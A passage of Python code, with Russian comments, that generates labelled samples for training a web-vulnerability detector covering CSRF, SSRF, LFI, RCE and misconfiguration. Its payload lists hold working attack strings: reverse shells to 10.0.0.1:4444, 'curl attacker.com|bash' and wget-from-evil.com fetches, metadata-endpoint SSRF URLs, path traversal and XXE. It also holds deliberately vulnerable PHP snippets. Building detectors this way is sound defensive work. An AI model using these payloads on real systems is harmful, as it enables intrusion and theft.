                        <input type="text" id="name" name="name" value="John Doe">
                    </div>
                    <div class="form-group">
                        <label for="email">Email:</label>
                        <input type="email" id="email" name="email" value="john@example.com">
                    </div>
                    <div class="form-group">
                        <label for="bio">Bio:</label>
                        <textarea id="bio" name="bio">Web developer with 5 years of experience.</textarea>
                    </div>
                    <div class="form-group">
                        <input type="submit" value="Update Profile">
                    </div>
                </form>
            </div>
        </body>
        </html>
        """,
        
        # Безопасная форма изменения пароля с CSRF-защитой
        lambda: f"""
        <html>
        <head>
            <title>Change Password</title>
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
        </head>
        <body>
            <h1>Change Your Password</h1>
            <div class="password-form">
                <form method="post" action="/change_password">
                    <input type="hidden" name="xsrf_token" value="{generate_random_string(32)}">
                    <div class="form-group">
                        <label for="current_password">Current Password:</label>
                        <input type="password" id="current_password" name="current_password" required>
                    </div>
                    <div class="form-group">
                        <label for="new_password">New Password:</label>
                        <input type="password" id="new_password" name="new_password" required>
                    </div>
                    <div class="form-group">
                        <label for="confirm_password">Confirm New Password:</label>
                        <input type="password" id="confirm_password" name="confirm_password" required>
                    </div>
                    <div class="form-group">
                        <button type="submit">Change Password</button>
                    </div>
                </form>
            </div>
        </body>
        </html>
        """,
        
        # Безопасная форма платежа с двойной защитой от CSRF (токен + доп. подтверждение)
        lambda: f"""
        <html>
        <head>
            <title>Transfer Funds</title>
            <link rel="stylesheet" href="/assets/css/banking.css">
        </head>
        <body>
            <h1>Transfer Funds</h1>
            <div class="transaction-form">
                <form method="post" action="/api/transfer">
                    <input type="hidden" name="csrf_token" value="{generate_random_string(32)}">
                    <input type="hidden" name="transaction_id" value="{generate_random_string(16)}">
                    <div class="form-group">
                        <label for="from_account">From Account:</label>
                        <select id="from_account" name="from_account">
                            <option value="12345678">Checking Account (****5678) - $3,421.50</option>
                            <option value="87654321">Savings Account (****4321) - $12,755.25</option>
                        </select>
                    </div>
                    <div class="form-group">
                        <label for="to_account">To Account:</label>
                        <input type="text" id="to_account" name="to_account" placeholder="Account Number">
                    </div>
                    <div class="form-group">
                        <label for="amount">Amount:</label>
                        <input type="number" id="amount" name="amount" step="0.01" min="0.01">
                    </div>
                    <div class="form-group">
                        <label for="memo">Memo:</label>
                        <input type="text" id="memo" name="memo" placeholder="Optional">
                    </div>
                    <div class="form-group">
                        <label for="confirm_code">Confirmation Code:</label>
                        <input type="text" id="confirm_code" name="confirm_code" placeholder="Enter code from your authenticator app">
                    </div>
                    <div class="form-group">
                        <button type="submit" class="primary-button">Transfer Funds</button>
                    </div>
                </form>
            </div>
        </body>
        </html>
        """,
        
        # Безопасная форма AJAX с защитой от CSRF
        lambda: f"""
        <html>
        <head>
            <title>Contact Form</title>
            <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
            <script>
                $(document).ready(function() {{
                    // Получение CSRF-токена из мета-тега
                    const csrfToken = $('meta[name="csrf-token"]').attr('content');
                    
                    // Добавление CSRF-токена во все AJAX-запросы
                    $.ajaxSetup({{
                        headers: {{
                            'X-CSRF-TOKEN': csrfToken
                        }}
                    }});
                    
                    $("#contact-form").submit(function(e) {{
                        e.preventDefault();
                        $.ajax({{
                            type: "POST",
                            url: "/api/contact",
                            data: $(this).serialize(),
                            success: function(response) {{
                                $("#result").html("<div class='success'>Message sent successfully!</div>");
                                $("#contact-form")[0].reset();
                            }},
                            error: function() {{
                                $("#result").html("<div class='error'>Error sending message. Please try again.</div>");
                            }}
                        }});
                    }});
                }});
            </script>
        </head>
        <body>
            <meta name="csrf-token" content="{generate_random_string(32)}">
            <h1>Contact Us</h1>
            <div class="contact-container">
                <form id="contact-form" method="post">
                    <input type="hidden" name="_token" value="{generate_random_string(32)}">
                    <div class="form-group">
                        <label for="name">Name:</label>
                        <input type="text" id="name" name="name" required>
                    </div>
                    <div class="form-group">
                        <label for="email">Email:</label>
                        <input type="email" id="email" name="email" required>
                    </div>
                    <div class="form-group">
                        <label for="subject">Subject:</label>
                        <input type="text" id="subject" name="subject" required>
                    </div>
                    <div class="form-group">
                        <label for="message">Message:</label>
                        <textarea id="message" name="message" rows="5" required></textarea>
                    </div>
                    <div class="form-group">
                        <button type="submit">Send Message</button>
                    </div>
                </form>
                <div id="result"></div>
            </div>
        </body>
        </html>
        """,
        
        # Безопасная форма SameSite куки и двойные токены
        lambda: f"""
        <html>
        <head>
            <title>Account Settings</title>
            <meta charset="utf-8">
            <meta name="csrf-param" content="_csrf">
            <meta name="csrf-token" content="{generate_random_string(32)}">
        </head>
        <body>
            <h1>Account Settings</h1>
            <div class="settings-form">
                <form method="post" action="/settings/update">
                <input type="hidden" name="_csrf" value="{generate_random_string(32)}">
                    <input type="hidden" name="request_verification_token" value="{generate_random_string(32)}">
                    <fieldset>
                        <legend>Notification Preferences</legend>
                        <div class="form-check">
                            <input type="checkbox" id="email_notifications" name="email_notifications" checked>
                            <label for="email_notifications">Email Notifications</label>
                        </div>
                        <div class="form-check">
                            <input type="checkbox" id="sms_notifications" name="sms_notifications">
                            <label for="sms_notifications">SMS Notifications</label>
                        </div>
                        <div class="form-check">
                            <input type="checkbox" id="browser_notifications" name="browser_notifications" checked>
                            <label for="browser_notifications">Browser Notifications</label>
                        </div>
                    </fieldset>
                    <div class="form-group">
                        <button type="submit">Save Settings</button>
                    </div>
            </form>
            </div>
        </body>
        </html>
        """
    ]
    
    # Создаем различные типы защищенных cookie
    secure_cookie_templates = [
        {"session": "12345abcde67890", "SameSite": "Strict", "Secure": "true", "HttpOnly": "true"},
        {"PHPSESSID": "s3ss10n1d", "SameSite": "Lax", "Secure": "true", "HttpOnly": "true"},
        {"jwt": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c", "SameSite": "Strict", "Secure": "true"},
        {"auth_token": "9876543210abcdef", "SameSite": "Lax", "Secure": "true", "HttpOnly": "true"},
        {"ASP.NET_SessionId": "asp12345678", "SameSite": "Strict", "Secure": "true", "HttpOnly": "true"}
    ]
    
    # Дополнительные защитные HTTP-заголовки
    secure_headers_templates = [
        {
            "Host": "example.com",
            "User-Agent": "Mozilla/5.0",
            "Accept": "text/html,application/xhtml+xml",
            "Content-Type": "application/x-www-form-urlencoded",
            "X-CSRF-Token": generate_random_string(32),
            "X-Frame-Options": "DENY",
            "Content-Security-Policy": "default-src 'self'"
        },
        {
            "Host": "example.com",
            "User-Agent": "Mozilla/5.0",
            "Accept": "text/html,application/xhtml+xml",
            "Content-Type": "application/x-www-form-urlencoded",
            "X-Requested-With": "XMLHttpRequest",
            "X-XSRF-TOKEN": generate_random_string(32)
        }
    ]
    
    # Генерация защищенных образцов
    for _ in range(num_samples // 2):
        html_template = random.choice(secure_form_templates)
        html = html_template()
        cookies = random.choice(secure_cookie_templates)
        headers = random.choice(secure_headers_templates)
        url = "http://example.com/" + random.choice(["profile", "account", "settings", "admin", "dashboard", "user", "payment"])
        
        # Извлекаем формы
        soup = BeautifulSoup(html, 'html.parser')
        forms = soup.find_all('form')
        
        # Извлекаем особенности форм
        has_csrf_token = False
        csrf_token_patterns = [
            'csrf', 'xsrf', 'token', 'nonce', 'authenticity_token', 'verify', 'security'
        ]
        
        # Проверяем скрытые поля на наличие токенов CSRF
        hidden_inputs = []
        for form in forms:
            hidden_inputs.extend(form.find_all('input', {'type': 'hidden'}))
        
        for input_field in hidden_inputs:
            field_name = input_field.get('name', '').lower()
            if any(pattern in field_name for pattern in csrf_token_patterns):
                has_csrf_token = True
                break
        
        # Проверяем мета-теги на наличие CSRF токенов
        meta_csrf = soup.find('meta', {'name': lambda x: x and 'csrf' in x.lower()})
        if meta_csrf:
            has_csrf_token = True
        
        # Признаки защищенности от CSRF
        features = [
            0 if has_csrf_token else 1,  # Есть CSRF-токен (0 означает отсутствие уязвимости)
            len(forms),  # Количество форм
            len(hidden_inputs),  # Количество скрытых полей
            1 if any('post' == form.get('method', '').lower() for form in forms) else 0,  # Есть ли POST формы
            1 if any('action' in form.attrs for form in forms) else 0,  # Есть ли атрибуты action
            1 if any('ajax' in str(tag).lower() or 'xhr' in str(tag).lower() for tag in soup.find_all('script')) else 0,  # Использование AJAX
            1 if any('jquery' in str(tag).lower() for tag in soup.find_all('script')) else 0,  # Использование jQuery
            1 if soup.find_all('button', {'type': 'submit'}) else 0,  # Наличие кнопок отправки
            len(cookies),  # Количество куки
            1 if 'session' in str(cookies).lower() else 0,  # Сессионные куки
            0 if any('SameSite' in k or 'Secure' in k for k in cookies.keys()) else 1,  # Наличие защитных атрибутов
            1 if 'admin' in url.lower() or 'settings' in url.lower() else 0,  # Чувствительные URL
            len(html),  # Размер HTML
            len(url),  # Длина URL
            len(str(cookies))  # Длина куки
        ]
        
        samples.append({
            'url': url,
            'html': html,
            'cookies': cookies,
            'headers': headers,
            'features': features,
            'is_vulnerable': False
        })
    
    return samples

def generate_ssrf_samples(num_samples=100):
    """Generate SSRF training samples (расширено)"""
    samples = []
    ssrf_payloads = [
        # Cloud metadata
        "http://169.254.169.254/latest/meta-data/", "http://metadata.google.internal/", "http://100.100.100.200/latest/meta-data/", "http://metadata.azure.com/",
        # Localhost/loopback
        "http://localhost:8080/admin", "http://127.0.0.1/phpinfo.php", "file:///etc/passwd", "http://0.0.0.0:80/", "http://[::1]/",
        # Internal IPs
        "http://10.0.0.1/internal-api", "http://192.168.1.1/router-admin", "http://172.16.0.1/secret",
        # Obfuscated IPs
        "http://0x7f000001/", "http://2130706433/", "http://localhost.localdomain/",
        # Uncommon protocols
        "gopher://127.0.0.1:6379/_INFO", "dict://localhost:11211/", "ftp://internal-ftp/confidential/", "ldap://127.0.0.1/",
        # DNS rebinding
        "http://rebind.testdomain.com/", "http://dynamic.dns/",
        # SSRF chain
        "http://evil.com/redirect?url=http://169.254.169.254/latest/meta-data/",
        # With @
        "http://127.0.0.1@evil.com/",
        # POST/JSON
        "http://api.internal/endpoint"
    ]
    ssrf_params = ["url", "path", "file", "dest", "redirect", "uri", "source", "callback", "next", "data", "continue", "domain", "host", "website", "feed", "to", "out", "image", "link", "proxy", "forward", "remote", "open", "load", "fetch", "resource"]
    protocols = ["gopher://", "dict://", "file://", "ftp://", "ldap://", "php://", "data://", "jar://", "zip://"]
    for _ in range(num_samples // 2):
        payload = random.choice(ssrf_payloads)
        param = random.choice(ssrf_params)
        proto = random.choice(protocols) if random.random() < 0.2 else ""
        url = f"http://example.com/proxy?{param}={proto}{payload}"
        html = f"""
        <html><head><title>Proxy Results</title></head><body>
        <div class='error'>Error fetching URL: Connection refused to {payload}</div>
        <div class='debug'>curl_exec() failed: Connection refused file_get_contents(): failed to open stream fsockopen(): unable to connect</div>
        <script>fetch('{payload}').then(r=>r.text()).catch(e=>console.error(e));</script>
        <meta name='redirect' content='{payload}'>
        <a href='{payload}'>link</a>
        <form action='/proxy'><input name='{param}' value='{payload}'></form>
        <header>X-Forwarded-For: 127.0.0.1</header>
        </body></html>
        """
        features = [
            int(any(p in url for p in ssrf_params)),
            url.count('&')+1 if '?' in url else 0,
            int('url=' in html.lower()),
            int('gopher://' in url.lower()),
            int('dict://' in url.lower()),
            int('smb://' in url.lower()),
            int('ldap://' in url.lower()),
            int('file://' in url.lower()),
            int('php://' in url.lower()),
            int(any(x in url.lower() for x in ['169.254.169.254','metadata.google.internal','metadata.azure.com','100.100.100.200'])),
            int(any(x in url.lower() for x in ['localhost','127.0.0.1','0.0.0.0','[::1]','localhost.localdomain'])),
            int(any(x in url for x in ['192.168.','10.','172.16.','172.17.','172.18.','172.19.','172.20.','172.21.','172.22.','172.23.','172.24.','172.25.','172.26.','172.27.','172.28.','172.29.','172.30.','172.31.'])),
            int('0x' in url.lower()),
            int(re.search(r'\d{8,10}', url) is not None),
            int('[' in url and ']' in url),
            int('@' in url),
            int('rebind' in url.lower() or 'dynamic.dns' in url.lower()),
            int('x-forwarded-for' in html.lower()),
            int('host:' in html.lower()),
            int('location:' in html.lower()),
            int(html.lower().count('redirect') > 1),
            int(any(x in html.lower() for x in ['connection refused','timeout','no route to host','invalid url','refused to connect'])),
            int(any(x in html.lower() for x in ['ami-id','instance-id','hostname','access-key'])),
            int(any(x in html.lower() for x in ['192.168.','10.','172.','localhost','127.0.0.1'])),
            int('location:' in html.lower()),
            0,
            len(html),
            html.lower().count('location:'),
            int('url=' in html.lower() and 'form' in html.lower()),
            int('url=' in html.lower() and 'script' in html.lower()),
            int('url=' in html.lower() and 'a href' in html.lower()),
            int('url=' in html.lower() and 'header' in html.lower()),
            int('url=' in html.lower() and 'cookie' in html.lower()),
        ]
        samples.append({'url': url, 'html': html, 'features': features, 'is_vulnerable': True, 'raw_payload': payload})
    # Non-vulnerable
    for _ in range(num_samples // 2):
        url = f"http://example.com/proxy?url=https://api.example.com/v1/data/{random.randint(1,10000)}"
        html = f"<html><body><div>Fetched external API data.</div></body></html>"
        features = [0]*len(samples[0]['features'])
        samples.append({'url': url, 'html': html, 'features': features, 'is_vulnerable': False, 'raw_payload': "Safe external URL"})
    return samples

def generate_lfi_samples(num_samples=100):
    """Generate LFI training samples"""
    samples = []
    
    # LFI payloads
    lfi_payloads = [
        "../../../etc/passwd",
        "..%2f..%2f..%2fetc%2fpasswd",
        "....//....//....//etc/passwd",
        "/etc/passwd%00",
        "php://filter/convert.base64-encode/resource=config.php",
        "php://input",
        "phar://archive.phar/file.txt",
        "zip://archive.zip#file.txt",
        "/proc/self/environ",
        "data://text/plain;base64,SGVsbG8="
    ]
    
    # Generate vulnerable samples
    for _ in range(num_samples // 2):
        payload = random.choice(lfi_payloads)
        url = f"http://example.com/page.php?file={payload}"
        html = f"""
        <html>
        <head>
            <title>File Viewer</title>
            <link rel="stylesheet" href="style.css">
            <meta charset="utf-8">
        </head>
        <body>
            <h1>File Viewer</h1>
            <div class="error">
                Warning: include({payload}): failed to open stream: No such file or directory in /var/www/html/page.php on line 10
            </div>
            <div class="debug">
                include($file);
                require_once($path);
                readfile($document);
                file_get_contents($source);
            </div>
            <?php
                include($_GET['file']);
                require_once($path);
                readfile($document);
                highlight_file($source);
            ?>
        </body>
        </html>
        """
        
        # Extract features
        soup = BeautifulSoup(html, 'html.parser')
        features = [
            len(html),  # Total HTML length
            len(re.findall(r'<input', html, re.IGNORECASE)),  # Number of input fields
            len(re.findall(r'<form', html, re.IGNORECASE)),  # Number of forms
            len(re.findall(r'javascript:', html, re.IGNORECASE)),  # JavaScript protocol usage
            len(soup.find_all('script')),  # Number of script tags
            len(soup.find_all('iframe')),  # Number of iframes
            len(soup.find_all('a', href=True)),  # Number of links
            len(soup.find_all('meta')),  # Number of meta tags
            len(soup.find_all('link')),  # Number of link tags
            len(re.findall(r'function\s*\(', html)),  # Number of JavaScript functions
            
            # File inclusion patterns
            len(re.findall(r'include\s*\(', html, re.IGNORECASE)),
            len(re.findall(r'require\s*\(', html, re.IGNORECASE)),
            len(re.findall(r'include_once\s*\(', html, re.IGNORECASE)),
            len(re.findall(r'require_once\s*\(', html, re.IGNORECASE)),
            len(re.findall(r'fopen\s*\(', html, re.IGNORECASE)),
            
            # Path traversal
            len(re.findall(r'\.\./', url)),
            len(re.findall(r'\.\.\\', url)),
            len(re.findall(r'%2e%2e%2f', url, re.IGNORECASE)),
            len(re.findall(r'%252e%252e%252f', url, re.IGNORECASE)),
            len(re.findall(r'\.\.%2f', url, re.IGNORECASE)),
            
            # Common targets
            len(re.findall(r'/etc/passwd', html)),
            len(re.findall(r'/etc/shadow', html)),
            len(re.findall(r'/proc/self/environ', html)),
            len(re.findall(r'wp-config\.php', html)),
            len(re.findall(r'config\.php', html)),
            
            # File operations
            len(re.findall(r'readfile\s*\(', html, re.IGNORECASE)),
            len(re.findall(r'file_get_contents\s*\(', html, re.IGNORECASE)),
            len(re.findall(r'show_source\s*\(', html, re.IGNORECASE)),
            len(re.findall(r'highlight_file\s*\(', html, re.IGNORECASE)),
            len(re.findall(r'include\s*\$_[A-Za-z0-9_]+', html)),
            
            # PHP wrappers
            len(re.findall(r'php://filter', html)),
            len(re.findall(r'php://input', html)),
            len(re.findall(r'phar://', html)),
            len(re.findall(r'zip://', html)),
            len(re.findall(r'data://', html))
        ]
        
        samples.append({
            'url': url,
            'html': html,
            'features': features,
            'is_vulnerable': True,
            'raw_payload': payload
        })
    
    # Generate non-vulnerable samples
    for _ in range(num_samples // 2):
        safe_file = f"templates/{generate_random_string()}.html"
        url = f"http://example.com/page.php?file={safe_file}"
        html = f"""
        <html>
        <head>
            <title>File Viewer</title>
            <link rel="stylesheet" href="style.css">
            <meta charset="utf-8">
        </head>
        <body>
            <h1>File Viewer</h1>
            <div class="content">
                <h2>Viewing file: {html_module.escape(safe_file)}</h2>
                <p>File contents would be displayed here.</p>
            </div>
        </body>
        </html>
        """
        
        # Extract features
        soup = BeautifulSoup(html, 'html.parser')
        features = [
            len(html),  # Total HTML length
            len(re.findall(r'<input', html, re.IGNORECASE)),  # Number of input fields
            len(re.findall(r'<form', html, re.IGNORECASE)),  # Number of forms
            len(re.findall(r'javascript:', html, re.IGNORECASE)),  # JavaScript protocol usage
            len(soup.find_all('script')),  # Number of script tags
            len(soup.find_all('iframe')),  # Number of iframes
            len(soup.find_all('a', href=True)),  # Number of links
            len(soup.find_all('meta')),  # Number of meta tags
            len(soup.find_all('link')),  # Number of link tags
            len(re.findall(r'function\s*\(', html)),  # Number of JavaScript functions
            
            # File inclusion patterns (all 0 for non-vulnerable)
            0, 0, 0, 0, 0,
            
            # Path traversal (all 0 for non-vulnerable)
            0, 0, 0, 0, 0,
            
            # Common targets (all 0 for non-vulnerable)
            0, 0, 0, 0, 0,
            
            # File operations (all 0 for non-vulnerable)
            0, 0, 0, 0, 0,
            
            # PHP wrappers (all 0 for non-vulnerable)
            0, 0, 0, 0, 0
        ]
        
        samples.append({
            'url': url,
            'html': html,
            'features': features,
            'is_vulnerable': False,
            'raw_payload': safe_file
        })
    
    return samples

def generate_rce_samples(num_samples=100):
    """Generate RCE training samples"""
    samples = []
    
    # Расширенный список RCE пейлоадов
    rce_payloads = [
        # Базовые команды для различных языков
        "system('id');",
        "exec('whoami');",
        "shell_exec('cat /etc/passwd');",
        "passthru('ls -la');",
        "`uname -a`",
        "$(cat /etc/shadow)",
        
        # Обход защиты с помощью кодирования
        "s\\ys\\te\\m('id');",  # Обход фильтрации с помощью escape-символов
        "{${system('id')}}",   # Обход через PHP-обработку переменных
        "sy''stem('id');",     # Внедрение пустых строк
        "/**/system('id');",   # Комментарии
        
        # Команды с конвейерами и перенаправлением вывода
        ";nc -e /bin/sh 10.0.0.1 4444;",
        "|wget http://evil.com/shell.php;",
        "|curl http://attacker.com/payload|bash",
        "python -c 'import os;os.system(\"id\")'",
        "perl -e 'system(\"id\")'",
        
        # Обход фильтров на основе пробелов
        "cat${IFS}/etc/passwd",
        "ping%09127.0.0.1",
        "ls${IFS}-la",
        
        # Внедрение команд с кодированием
        "echo -e '\\x63\\x61\\x74\\x20\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64'|bash",
        "echo${IFS}$(base64${IFS}-d<<<Y2F0IC9ldGMvcGFzc3dk)|bash",
        
        # Шелл-загрузчики
        "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
        "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"]);'",
        "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"10.0.0.1\",\"4444\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'",
        
        # Обфускация команд через переменные среды
        "a=cat;b=/etc/passwd;$a$b",
        "$(printf '\\x63\\x61\\x74\\x20\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64')",
        
        # Обход через регистр
        "CaT /etc/paSSwD",
        
        # Обход через инъекции в XML/JSON
        "<!DOCTYPE test [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]><test>&xxe;</test>",
        "{\"key\": \"$(id)\"}",
        
        # Обход с помощью обратных ссылок и альтернативных интерпретаторов
        "php -r 'system(\"id\");'",
        "python3 -c \"__import__('os').system('id')\"",
        "nodejs -e \"require('child_process').exec('id', function(error, stdout, stderr) { console.log(stdout) });\"",
        
        # Сложные обходы WAF
        ";set+/p=id&&cmd+/c+%p%",
        "|set+/p=cat+/etc/passwd&&cmd+/c+%p%",
        "&&set+/p=whoami&&cmd+/c+%p%",
        "||set+/p=ls+-la&&cmd+/c+%p%"
    ]
    
    # Расширенные шаблоны уязвимых HTML страниц
    vulnerable_html_templates = [
        # Базовый шаблон
        lambda payload: f"""
        <html>
        <head>
            <title>Debug Console</title>
            <link rel="stylesheet" href="style.css">
            <meta charset="utf-8">
        </head>
        <body>
            <h1>Debug Console</h1>
            <div class="output">
                Command output:
                <pre>
                <?php
                    system($_GET['cmd']);
                    exec($command);
                    shell_exec($input);
                    passthru($args);
                    echo `{payload}`;
                ?>
                </pre>
            </div>
            <div class="debug">
                Warning: shell_exec() has been disabled for security reasons
                system() command failed: Permission denied
                exec() is restricted in safe_mode
            </div>
        </body>
        </html>
        """,
        
        # Шаблон с внедрением через eval
        lambda payload: f"""
        <html>
        <head>
            <title>PHP Evaluator</title>
        </head>
        <body>
            <h1>PHP Code Evaluator</h1>
            <div class="result">
                <pre>
                <?php
                    // Debug mode enabled
                    ini_set('display_errors', 1);
                    error_reporting(E_ALL);
                    
                    // Execute user supplied code - DANGEROUS!
                    $userCode = $_GET['code'];
                    if ($userCode) {{
                        eval($userCode); // VULNERABLE to RCE
                    }}
                    
                    // Example of user supplied code with RCE
                    // {payload}
                ?>
                </pre>
            </div>
        </body>
        </html>
        """,
        
        # Шаблон с уязвимым исполнением shell-команд через параметры
        lambda payload: f"""
        <html>
        <head>
            <title>System Utility</title>
        </head>
        <body>
            <h1>Network Diagnostics Tool</h1>
            <div class="tool-output">
                <h3>Ping Results:</h3>
                <pre>
                <?php
                    // INSECURE: User input directly passed to shell command
                    $host = $_GET['host'];
                    if ($host) {{
                        $cmd = "ping -c 4 " . $host;
                        system($cmd);
                    }}
                    
                    // Example of attack: ?host={payload.replace(";", "%3B")}
                ?>
                </pre>
            </div>
            <form action="/ping" method="get">
                <input type="text" name="host" placeholder="Enter hostname or IP">
                <input type="submit" value="Ping">
            </form>
        </body>
        </html>
        """,
        
        # Шаблон с uplaod-функционалом и обработкой файлов
        lambda payload: f"""
        <html>
        <head>
            <title>File Manager</title>
        </head>
        <body>
            <h1>File Upload and Processing</h1>
            <div class="file-processor">
                <pre>
                <?php
                    // Example of processing file containing payload: {payload}
                    $filename = $_GET['file'];
                    if ($filename) {{
                        $output = shell_exec("file " . $filename); // VULNERABLE
                        echo "File type: " . $output;
                        
                        // Process file content
                        $content = file_get_contents($filename);
                        echo "Preview: " . substr($content, 0, 100);
                    }}
                ?>
                </pre>
            </div>
        </body>
        </html>
        """
    ]
    
    # Расширенные параметры URL для уязвимостей RCE
    rce_param_names = [
        "cmd", "command", "exec", "execute", "ping", "query", "run", 
        "system", "code", "shell", "do", "action", "proc", "process",
        "file", "path", "url", "load", "include", "require", "import",
        "eval", "function", "callback", "host", "ip", "domain", "address"
    ]
    
    # Generate vulnerable samples
    for _ in range(num_samples // 2):
        payload = random.choice(rce_payloads)
        param_name = random.choice(rce_param_names)
        url = f"http://example.com/debug.php?{param_name}={payload}"
        html_template = random.choice(vulnerable_html_templates)
        html = html_template(payload)
        
        # Extract features
        soup = BeautifulSoup(html, 'html.parser')
        features = [
            len(html),  # Total HTML length
            len(re.findall(r'<input', html, re.IGNORECASE)),  # Number of input fields
            len(re.findall(r'<form', html, re.IGNORECASE)),  # Number of forms
            len(re.findall(r'javascript:', html, re.IGNORECASE)),  # JavaScript protocol usage
            len(soup.find_all('script')),  # Number of script tags
            len(soup.find_all('iframe')),  # Number of iframes
            len(soup.find_all('a', href=True)),  # Number of links
            len(soup.find_all('meta')),  # Number of meta tags
            len(soup.find_all('link')),  # Number of link tags
            len(re.findall(r'function\s*\(', html)),  # Number of JavaScript functions
            
            # Command execution functions
            len(re.findall(r'system\s*\(', html, re.IGNORECASE)),
            len(re.findall(r'exec\s*\(', html, re.IGNORECASE)),
            len(re.findall(r'shell_exec\s*\(', html, re.IGNORECASE)),
            len(re.findall(r'passthru\s*\(', html, re.IGNORECASE)),
            len(re.findall(r'eval\s*\(', html, re.IGNORECASE)),
            
            # Shell commands
            len(re.findall(r'`.*`', html)),
            len(re.findall(r'ps\s+aux', html)),
            len(re.findall(r'kill\s+-9', html)),
            len(re.findall(r'pkill', html)),
            len(re.findall(r'killall', html)),
            len(re.findall(r'nohup', html))
        ]
        samples.append({
            'url': url,
            'html': html,
            'features': features,
            'is_vulnerable': True,
            'raw_payload': payload
        })
    # Generate non-vulnerable samples
    for _ in range(num_samples // 2):
        safe_cmd = generate_random_string()
        param_name = random.choice(rce_param_names)
        url = f"http://example.com/debug.php?{param_name}={safe_cmd}"
        html = f"""
        <html>
        <head>
            <title>Debug Console</title>
            <link rel=\"stylesheet\" href=\"style.css\">
            <meta charset=\"utf-8\">
        </head>
        <body>
            <h1>Debug Console</h1>
            <div class=\"output\">
                Command not recognized: {html_module.escape(safe_cmd)}
            </div>
            <div class=\"help\">
                Available commands: help, status, version, info
            </div>
        </body>
        </html>
        """
        soup = BeautifulSoup(html, 'html.parser')
        features = [
            len(html),  # Total HTML length
            len(re.findall(r'<input', html, re.IGNORECASE)),  # Number of input fields
            len(re.findall(r'<form', html, re.IGNORECASE)),  # Number of forms
            len(re.findall(r'javascript:', html, re.IGNORECASE)),  # JavaScript protocol usage
            len(soup.find_all('script')),  # Number of script tags
            len(soup.find_all('iframe')),  # Number of iframes
            len(soup.find_all('a', href=True)),  # Number of links
            len(soup.find_all('meta')),  # Number of meta tags
            len(soup.find_all('link')),  # Number of link tags
            len(re.findall(r'function\s*\(', html)),  # Number of JavaScript functions
            # Command execution functions (all 0 for non-vulnerable)
            0, 0, 0, 0, 0,
            # Shell commands (all 0 for non-vulnerable) - 6 features
            0, 0, 0, 0, 0, 0 
        ]
        samples.append({
            'url': url,
            'html': html,
            'features': features,
            'is_vulnerable': False,
            'raw_payload': safe_cmd
        })
    return samples

def generate_a05_security_misconfiguration_samples(num_samples=100):
    """Generate Security Misconfiguration training samples."""
    samples = []
    # Common security headers to check for absence (vulnerable if missing)
    # For simplicity, we'll assume HTTPS for HSTS relevance in vulnerable cases.
    security_headers_checklist = {
        "Content-Security-Policy": "default-src 'self'",
        "Strict-Transport-Security": "max-age=31536000; includeSubDomains",
        "X-Content-Type-Options": "nosniff",
        "X-Frame-Options": "SAMEORIGIN",
        # "Permissions-Policy": "geolocation=(), microphone=()" # Example
    }
    header_keys = list(security_headers_checklist.keys())

    verbose_error_patterns = [
        r"stack trace:", r"exception in thread", r"uncaught exception",
        r"ORA-[0-9]{5}", r"mysql_fetch_array\(\) expects parameter",
        r"Call to undefined function", r"Notice: Undefined variable",
        r"Traceback \(most recent call last\):",
        r"failed to open stream", r"No such file or directory"
    ]

    # Generate vulnerable samples (missing headers or verbose errors)
    for i in range(num_samples // 2):
        html_content = "<html><body><h1>Welcome</h1><p>This is a test page.</p></body></html>"
        headers = {"Server": "Apache/2.4.53 (Unix)", "Content-Type": "text/html"} # Base headers
        is_vulnerable = True
        vuln_type_description = ""
        # Features: [CSP, HSTS, XCTO, XFO, VerboseErrorCount, ServerVersionExposed]
        features = [1.0] * len(header_keys) + [0.0, 0.0] # Assume all headers present initially

        # Pick a misconfiguration type
        misconfig_choice = random.random()

        if misconfig_choice < 0.6: # 60% chance: Missing one or more security headers
            num_missing = random.randint(1, len(header_keys))
            missing_headers = random.sample(header_keys, num_missing)
            descriptions = []
            for idx, h_name in enumerate(header_keys):
                if h_name in missing_headers:
                    features[idx] = 0.0 # Mark as missing
                    descriptions.append(f"Missing {h_name}")
                else:
                    headers[h_name] = security_headers_checklist[h_name]
            vuln_type_description = ", ".join(descriptions)
            if "Apache/2.4.53" in headers.get("Server", ""):
                 features[len(header_keys) + 1] = 1.0 # Server version exposed

        elif misconfig_choice < 0.9: # 30% chance: Verbose error in HTML
            # Add all security headers for this case to focus on the error
            for h_name, h_value in security_headers_checklist.items():
                headers[h_name] = h_value
            chosen_error = random.choice(verbose_error_patterns)
            html_content = f"<html><body><p>Error: {chosen_error} detail...</p></body></html>"
            features[len(header_keys)] = 1.0 # Verbose error count set to 1
            vuln_type_description = f"Verbose error: {chosen_error}"
            if "Apache/2.4.53" in headers.get("Server", ""):
                 features[len(header_keys) + 1] = 1.0 # Server version exposed
        else: # 10% chance: Server version exposed (but other headers might be okay)
            for h_name, h_value in security_headers_checklist.items():
                headers[h_name] = h_value # All headers present
            # Server header already includes version
            vuln_type_description = "Server version exposed in Server header"
            features[len(header_keys) + 1] = 1.0
            
        samples.append({
            'url': f"http://example.com/page{i}.html",
            'html': html_content,
            'headers': headers,
            'features': features,
            'is_vulnerable': is_vulnerable,
            'raw_payload': vuln_type_description
        })

    # Generate non-vulnerable samples (all headers present, no verbose errors, generic server header)
    for i in range(num_samples // 2):
        headers = {"Server": "WebAppServer", "Content-Type": "text/html"} # Generic server
        for h_name, h_value in security_headers_checklist.items():
            headers[h_name] = h_value
        features = [1.0] * len(header_keys) + [0.0, 0.0] # All present, no errors, no specific version
        samples.append({
            'url': f"https://example.com/securepage{i}.html",
